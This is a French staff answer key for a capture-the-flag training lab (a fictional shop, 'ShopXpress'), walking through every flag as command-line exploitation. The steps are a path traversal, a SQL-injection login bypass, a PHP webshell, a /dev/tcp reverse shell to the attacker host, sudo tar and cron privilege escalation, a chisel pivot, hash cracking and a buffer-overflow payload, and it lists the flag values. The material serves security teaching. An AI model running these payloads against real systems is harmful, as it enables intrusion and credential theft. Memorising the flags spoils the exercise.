# Walkthrough STAFF — lab découverte « ShopXpress »

> **Corrigé complet, pas à pas.** Document réservé à l'encadrement. Point de vue
> **attaquant depuis une Kali** : le joueur ne reçoit **que l'IP:port du service
> `web`** (la boutique ShopXpress ; le reste du LAN se gagne par compromission + pivot).
>
> Pour chaque flag, le bloc *(rejeu staff)* donne l'équivalent validé (tiré de
> `scripts/verify-chain.sh`, qui rejoue toute la chaîne : `make test-chain`).
> Adresses **autonomes** : `web=172.31.10.10`, `firewall=172.31.10.2 / .20.2`,
> `files=172.31.20.11`, `admin=172.31.20.12`. Sous CTFd les subnets/port sont
> réécrits par équipe — la logique reste identique.

Notation : `$WEB_IP` = IP du point d'entrée, `$B = http://$WEB_IP:8080`.

---

## Acte 0 — Reconnaissance du point d'entrée

```bash
nmap -sV -sC -p- $WEB_IP            # 80/8080 (Apache/PHP). Le SSH n'est PAS exposé aux joueurs.
whatweb http://$WEB_IP:8080/
gobuster dir -u http://$WEB_IP:8080/ -w /usr/share/wordlists/dirb/common.txt -x php
```

Pages utiles : `/` (boutique), `/produits.php` (catalogue), `/apropos.php`
(**personnel + convention de login**), `/connexion.php` (**espace gérant**),
`/telecharger.php` (**factures**), `/robots.txt`, `/catalogue.jpg`.

`/apropos.php` donne la **convention de login** (*1ʳᵉ lettre du prénom + `.` + nom*,
ex. `s.morel`) et le personnel : Julien Martin (j.martin, admin SI), Sophie Morel
(s.morel, stocks), Lucas Petit (l.petit, SAV), Nadia Roux (n.roux, compta), Karim
Dubois (k.dubois, dev). La recon est aussi dans l'EXIF du catalogue :

```bash
wget http://$WEB_IP:8080/catalogue.jpg && exiftool catalogue.jpg
# Artist: k.dubois | Comment: ShopXpress - catalogue interne. Espace gerant: /connexion.php
```

---

## Acte 1 — web (DMZ, boutique ShopXpress) : 3 vulns web → www-data → root

### Vuln A — `FLAG_WEB_REVERSE` · [Lecture de fichiers] path traversal  *(bonus)*

`/telecharger.php?facture=<nom>` fait `readfile("/var/www/app/factures/".$_GET['facture'])`
**sans validation** → on remonte l'arborescence et on lit des fichiers arbitraires
**en tant que www-data** :

```bash
# fichier confidentiel hors docroot → le flag
curl -s "$B/telecharger.php?facture=../../private/rapport-ventes.txt"
# RAPPORT DE VENTES — CONFIDENTIEL ... Note interne : AMSI{web_lfi_path_traversal_dev}

# fichiers système
curl -s "$B/telecharger.php?facture=../../../../etc/passwd"

# config de l'appli → identifiants base64 du connecteur STOCK (laissés par k.dubois)
curl -s "$B/telecharger.php?facture=../config/config.php"
# $SMB_CREDENTIALS_B64 = 'cy5tb3JlbDpzdXBlcm1hbg==';
echo 'cy5tb3JlbDpzdXBlcm1hbg==' | base64 -d
# s.morel:superman   ← /!\ leçon : base64 = ENCODAGE, pas chiffrement
```

Ces identifiants `s.morel:superman` resserviront sur le LAN (SMB/SSH). Le mot de
passe exact dépend de l'instance (`S_MOREL_PW`, `superman` en autonome).

> *(rejeu staff)* `curl -s "$B/telecharger.php?facture=../../private/rapport-ventes.txt"`

### Vuln B — [Auth bypass] injection SQL sur `/connexion.php`  *(porte vers la RCE)*

L'espace gérant authentifie par une requête **concaténée** (SQLite) :
`SELECT * FROM users WHERE username='$user' AND password='$pass'`. Le mot de passe
en base est haché (sha256) → inutile de le lire ; on **contourne** l'auth :

```bash
curl -s -c jar --data-urlencode "user=admin'--" --data-urlencode "pass=x" $B/connexion.php
# admin'--  commente la fin de la requête → la condition mot de passe disparaît
curl -s -b jar $B/admin/index.php | grep -i back-office     # session gérant : back-office OK
```

On accède au **back-office**, qui héberge l'import de visuels produit (→ vuln C).

> *(rejeu staff)* SQLi `user=admin'--` puis GET `/admin/index.php` avec le cookie de session.

### Vuln C — `FLAG_WEB_RCE` · [Upload PHP non filtré → RCE] → www-data  *(spine)*

`/admin/upload.php` (réservé au back-office, donc derrière la vuln B) accepte un
fichier **sans contrôle d'extension/type** → on dépose un webshell `.php` dans
`/uploads/` (servi par Apache/mod_php) :

```bash
printf '<?php system($_GET["cmd"]); ?>' > shell.php
curl -s -b jar -F "image=@shell.php" $B/admin/upload.php          # session gérant requise
curl -s "$B/uploads/shell.php" --get --data-urlencode 'cmd=id'
# uid=33(www-data) ...   → shell web obtenu
```

⚠️ Le jeton de cette étape n'est **pas** un fichier sur le disque (`/var/www/flag_user.txt`
ne contient qu'un **indice**) : la path traversal ne suffit donc pas. Il faut
**EXÉCUTER** une commande — le flag est dans l'**environnement** du serveur. C'est la
leçon « lecture de fichier ≠ exécution de code » :

```bash
curl -s "$B/uploads/shell.php" --get --data-urlencode 'cmd=env | grep AMSI'
# FLAG_WEB_RCE=AMSI{web_upload_php_rce_dev}     (ou: printenv FLAG_WEB_RCE)
```

Reverse shell complet (Kali : `nc -lvnp 4444`) :

```bash
curl -s "$B/uploads/shell.php" --get --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1"'
```

On obtient un shell **www-data** sur web.

> *(rejeu staff)* upload `shell.php` (cookie gérant) puis `GET /uploads/shell.php?cmd=printenv FLAG_WEB_RCE`.
> Note durcissement : `FLAG_WEB_REVERSE`/`FLAG_WEB_ROOT`/`S_MOREL_PW` sont **retirés** de
> l'env des services (le webshell ne peut pas les `printenv` pour sauter la traversal/la privesc).

### `FLAG_WEB_ROOT` · [Privesc] sudo tar GTFOBins → root  *(spine)*

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/tar      ← laissé par l'équipe dev (sudoers.d/40-deploy)
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# id → uid=0(root)
cat /root/flag_root.txt
# AMSI{web_sudo_tar_root_dev}
```

> *(rejeu staff)* `docker exec -u www-data web sh -c 'sudo -n tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="sh -c \"id; cat /root/flag_root.txt\""'`

---

## Acte 1.5 — Le PIVOT (web → LAN)

web possède une **route vers le LAN** (`172.31.20.0/24 via 172.31.10.2`, posée par
son entrypoint avec `NET_ADMIN`). Le LAN n'est **pas publié** : on l'atteint **par
web**. ⚠️ web n'expose **aucun compte SSH** (root verrouillé, `www-data` sans
shell) : on pivote par le **shell www-data déjà obtenu** (vuln C), pas par un
`ssh -J ...@web`.

```bash
# 1) Reco depuis le shell web (déjà sur place)
for h in 11 12; do (echo > /dev/tcp/172.31.20.$h/22) 2>/dev/null && echo "172.31.20.$h:22 ouvert"; done
#   → .11 (files: 445/22), .12 (admin: 22). web a aussi ssh + smbclient (agir directement).

# 2) Tunnel SOCKS avec chisel (méthode reine — outils Kali via le pivot) :
#    Kali:   ./chisel server -p 8000 --reverse
#    web :   ./chisel client <IP_KALI>:8000 R:1080:socks      # depuis le shell web
#    Kali:   proxychains smbclient -N -L //172.31.20.11
#            proxychains ssh -i id_admin j.martin@172.31.20.12

# 3) ssh -J : utile UNE FOIS qu'on a un compte SSH dans le LAN (s.morel sur files) :
#    proxychains ssh -J s.morel@172.31.20.11 -i id_admin j.martin@172.31.20.12
```

---

## Acte 2 — fileshare (LAN) : Recon → Forensique → Stégano → Crypto → root

> À travers le pivot (`proxychains …`) ou directement depuis un shell web. Cible `172.31.20.11`.

### Flag 4 — `FLAG_FILES_RECON` · [Recon SMB anonyme]  *(spine)*

```bash
smbclient -N -L //172.31.20.11             # partages : public (ok), stock (réservé)
smbclient -N //172.31.20.11/public
smb> get note-interne.txt
smb> mget capture.pcap photo-produit.jpg
smb> cd backup; get hashes.txt
# note-interne.txt :
#   Le partage STOCK est réservé à s.morel. Token de recon : AMSI{smb_anon_recon_dev}
```

> *(rejeu staff)* `docker exec files sh -c 'smbclient -N //127.0.0.1/public -c "get note-interne.txt -"'`

### Flag 5 — `FLAG_DB_PIVOT` · [Forensique réseau, pcap en clair]  *(bonus)*

```bash
strings capture.pcap | grep -iE 'pass|login|AMSI'
# … login du service de sauvegarde en CLAIR …  AMSI{pcap_clear_login_dev}
# (ou Wireshark → Follow TCP Stream sur l'échange HTTP)
```

> *(rejeu staff)* `docker exec files sh -c 'strings /srv/public/capture.pcap' | grep AMSI`

### Flag 6 — `FLAG_DB_ROOT` · [Stéganographie, données appendues]  *(bonus)*

```bash
binwalk photo-produit.jpg        # données après la fin du JPEG
strings photo-produit.jpg | tail
# --- ShopXpress backup ---
# passphrase: stock-backup-2024
# FLAG: AMSI{stego_image_hidden_dev}
```

> *(rejeu staff)* `docker exec files sh -c 'strings /srv/public/photo-produit.jpg' | grep AMSI`

### Flag 7 — `FLAG_FILES_RCE` · [Crypto : cassage de hash MD5]  *(spine)*

```bash
cat hashes.txt
# s.morel:<md5 de 'superman'>     (+ l.petit, n.roux — red herrings, aussi crackables)
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# s.morel : superman
# (ou : hashcat -m 0 hashes.txt rockyou.txt)

# Le mot de passe craqué = compte SMB/SSH s.morel → accès au partage STOCK :
smbclient //172.31.20.11/stock -U 's.morel%superman' -c 'get flag_acces.txt -'
# Acces STOCK confirme. AMSI{md5_crack_rockyou_dev}
```

> Raccourci : le base64 lu via le path traversal (vuln A) donne déjà `s.morel:superman`.
> *(rejeu staff)* `docker exec files su s.morel -c 'cat /srv/stock/flag_acces.txt'`

### Flag 8 — `FLAG_FILES_ROOT` · [Privesc : cron + script world-writable]  *(spine)*

Connecté en `s.morel` (SSH avec le mot de passe craqué), on inspecte le cron :

```bash
ssh s.morel@172.31.20.11          # mot de passe : superman
ls -l /opt/shopxpress/maintenance.sh
# -rw-rw-rw- 1 root root ...  ← WORLD-WRITABLE, lancé par cron ROOT chaque minute
cat /etc/cron.d/shopxpress-maint
# * * * * * root /bin/sh /opt/shopxpress/maintenance.sh

# On injecte une commande exécutée par root au prochain tick (~1 min) :
echo 'cp /root/flag_root.txt /tmp/f.txt; chmod 644 /tmp/f.txt' >> /opt/shopxpress/maintenance.sh
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'   >> /opt/shopxpress/maintenance.sh
sleep 65
cat /tmp/f.txt                    # AMSI{cron_writable_root_dev}
/tmp/rootbash -p                  # euid=0 → root persistant
```

Loot root (clé SSH de l'admin Julien Martin) :

```bash
cat /root/notes-admin.txt
#   J'accède à mon poste admin en SSH : ssh -i id_admin j.martin@172.31.20.12
cp /root/id_admin ~/ ; chmod 600 id_admin
```

> *(rejeu staff, sans attendre le tick)* on exécute le script en root (= ce que fait
> cron) après injection : voir `verify-chain.sh` (« cron root + script world-writable »).

---

## Acte 3 — admin / workstation (LAN) : SSH → Pwn → Reverse → back-office

### Accès — rebond SSH par clé lootée

```bash
ssh -i id_admin -o StrictHostKeyChecking=no j.martin@172.31.20.12
# (via le pivot : proxychains ssh -i id_admin j.martin@172.31.20.12)
id    # uid=1000(j.martin)  ← compte non privilégié
```

> *(rejeu staff)* `docker exec files ssh -i /root/id_admin -o StrictHostKeyChecking=no j.martin@172.31.20.12 id`

### Flag 9 — `FLAG_WS_ROOT` · [Pwn : buffer overflow ret2win]  *(spine)*

`/usr/local/bin/vault` est **SUID root**. Source : `read(0, buf, 0x100)` dans un
`buf[64]`, compilé `-fno-stack-protector -no-pie -O0`. Une fonction `win()` fait
`setuid(0); execve("/bin/sh")`.

```bash
objdump -d /usr/local/bin/vault | grep -A1 '<win>:'    # 0000000000401196 <win>:
# Offset = 64 (buf) + 8 (rbp sauvé) = 72, puis l'adresse de retour.

# Subtilité VALIDÉE : read() lit jusqu'à 256 octets ; envoyer payload ET commandes
# d'un coup ferait avaler tout par read(). On envoie le payload, on PAUSE (read rend
# la main sur ~80 octets), PUIS on parle au shell root.
{ python3 -c "import sys;sys.stdout.buffer.write(b'A'*72+(0x401196).to_bytes(8,'little'))";
  sleep 1; echo 'id; cat /root/flag_root.txt'; sleep 1; } | /usr/local/bin/vault
# uid=0(root) ... AMSI{bof_ret2win_root_dev}
```

Variante **pwntools** :

```python
from pwn import *
io = process('/usr/local/bin/vault')
io.send(b'A'*72 + p64(0x401196)); time.sleep(0.5)
io.sendline(b'id; cat /root/flag_root.txt'); print(io.recvall(timeout=2).decode())
```

> *(rejeu staff)* adresse de `win()` extraite dynamiquement par `verify-chain.sh`
> (objdump sur l'hôte), repli `0x401196`.

### Flag 10 — `FLAG_FINAL` · [Reverse engineering : XOR]  *(spine)*

`/usr/local/bin/backoffice-check` (SUID root) compare l'entrée à un tableau `enc[]`
**XORé** avec une clé d'un octet ; si ça correspond, il lit le **trophée**
`/opt/shopxpress/trophy`.

```bash
# Reverse (Ghidra / objdump) : on récupère enc[] et la clé (0x5b).
python3 -c "
enc=[0x08,0x33,0x34,0x2b,0x03,0x2b,0x29,0x3e,0x28,0x28,0x76,0x1a,0x3f,0x36,0x76,0x69,0x6b,0x69,0x6f]
print(''.join(chr(b^0x5b) for b in enc))"
# ShopXpress-Adm-2024      ← mot de passe maître du back-office

echo 'ShopXpress-Adm-2024' | /usr/local/bin/backoffice-check
# Acces back-office accorde (compromission complete).
# === ACCES BACK-OFFICE ShopXpress — COMPROMISSION COMPLETE ===
# AMSI{reverse_backoffice_takeover_dev}
```

> *(rejeu staff)* `printf 'ShopXpress-Adm-2024\n' | docker exec -i -u j.martin workstation /usr/local/bin/backoffice-check`

---

## Récapitulatif de la chaîne

| # | Flag (env) | Catégorie | Machine | Gating |
|---|---|---|---|---|
| 1 | `FLAG_WEB_RCE`     | Web (SQLi auth bypass → upload PHP RCE) | web   | **spine** |
| 2 | `FLAG_WEB_REVERSE` | Web (path traversal / lecture fichiers) | web   | bonus |
| 3 | `FLAG_WEB_ROOT`    | Privesc (sudo tar GTFOBins)             | web   | **spine** |
| 4 | `FLAG_FILES_RECON` | Recon SMB anonyme                       | files | **spine** |
| 5 | `FLAG_DB_PIVOT`    | Forensique (pcap)                       | files | bonus |
| 6 | `FLAG_DB_ROOT`     | Stéganographie                          | files | bonus |
| 7 | `FLAG_FILES_RCE`   | Crypto (MD5/rockyou)                    | files | **spine** |
| 8 | `FLAG_FILES_ROOT`  | Privesc (cron writable)                 | files | **spine** |
| 9 | `FLAG_WS_ROOT`     | Pwn (BOF ret2win)                       | admin | **spine** |
| 10| `FLAG_FINAL`       | Reverse (XOR) → back-office             | admin | **spine** |

**Les 3 vulns web (machine 1)** : path traversal (lecture de fichiers, flag 2) ·
SQLi auth bypass (porte du back-office) · upload PHP non filtré (RCE → www-data,
flag 1). Puis privesc sudo tar (flag 3).

**Spine obligatoire (déblocage linéaire dans CTFd) :** 1 → 3 → 4 → 7 → 8 → 9 → 10.
**Bonus (couvrent lecture de fichiers / Forensique / Stégano) :** 2, 5, 6 — non bloquants.

> Les valeurs `…_dev` ci-dessus sont celles du mode **autonome** (`.env.example`).
> En production CTFd, chaque équipe reçoit des flags **uniques** dérivés de son jeton
> (`AMSI{<slug>_<jeton>}`) — la mécanique d'exploitation est identique.

## Tout rejouer automatiquement

```bash
make up            # build + démarre l'infra (3 machines + firewall)
make test          # invariants réseau (pivot ouvert, seul web publié) — verify-firewall.sh
make test-chain    # rejoue les étapes et vérifie chaque flag — verify-chain.sh
```
